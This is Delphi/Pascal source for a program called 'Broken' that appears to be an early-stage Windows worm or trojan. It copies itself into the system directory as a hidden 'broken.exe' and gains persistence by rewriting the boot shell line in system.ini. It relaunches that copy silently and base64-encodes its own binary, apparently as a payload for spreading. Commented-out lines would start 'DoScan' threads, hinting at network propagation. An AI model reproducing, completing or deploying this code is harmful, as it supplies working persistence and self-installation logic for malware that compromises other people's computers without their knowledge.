   program Broken;

   uses
     Windows,
     ShellAPI,
     pBase64 in 'pBase64.pas';

   Var
     FileName: String;
     ThreadID: Dword;

   Function FileExists(Const FileName: String): Bool;
   Var
     FileData      :TWin32FindData;
     Handle        :Cardinal;
   Begin
     Handle := FindFirstFile(pChar(FileName), FileData);
     If Handle <> INVALID_HANDLE_VALUE Then
     Begin
       Result := True;
       FindClose(Handle);
     End Else
       Result := False;
   End;

   Function CreateBASE64(Name: String): Bool;
   Var
     _input        :FILE;
     _output       :FILE;

     FileBuf       :AnsiString;
     BaseBuf       :AnsiString;

     Size          :Integer;
   Begin
     If FileExists(Name+'64') Then Exit;

     AssignFile(_input, Name);
     FileMode := 0;
     {$I-}
     Reset(_input, 1);
     If IOResult = 0 Then
     Begin
       Size := FileSize(_input);
       SetLength(FileBuf, FileSize(_input));
       BlockRead(_input, FileBuf[1], FileSize(_input));
       Base64Encode(FileBuf, BaseBuf);
       CloseFile(_input);
     End;

     AssignFile(_output,Name+'64');
     Rewrite(_output, 1);
     BlockWrite(_output, BaseBuf[1], Size);
     CloseFile(_output);
     {$I+}
   End;

   Function CreateInstall: Bool;
   Const
     faHidden = $00000002;
   Var
     Dir     :Array[0..255] Of Char;
     Path    :String;
   Begin
     Result := False;

     GetSystemDirectory(Dir, 256);

     Path := String(Dir)+'\broken.exe';
     Filename := Path;

     If (ParamStr(0) <> Path) Then
     Begin
       CopyFile(pChar(ParamStr(0)), pChar(Path), False);
       SetFileAttributes(pChar(Path), faHidden);

       WritePrivateProfileString('boot', 'shell', 'Explorer broken.exe', 'system.ini');

       ShellExecute(0, 'open', pChar(Path), nil, nil, 0);
       Result := True;
     End;
   End;

   Procedure DoInstall;
   Begin
     CreateInstall;
     CreateBASE64(FileName);
     Sleep(1000);
   End;

   begin

     If CreateInstall          Then ExitProcess(0);
     If CreateBASE64(FileName) Then
     Begin
       CreateThread(NIL, 0, @DoInstall, NIL, 0, ThreadID);
       {
       CreateThread(NIL, 0, @DoScan,    NIL, 0, ThreadID);
       CreateThread(NIL, 0, @DoScan,    NIL, 0, ThreadID);
       CreateThread(NIL, 0, @DoScan,    NIL, 0, ThreadID);
       }
     End;

   end.

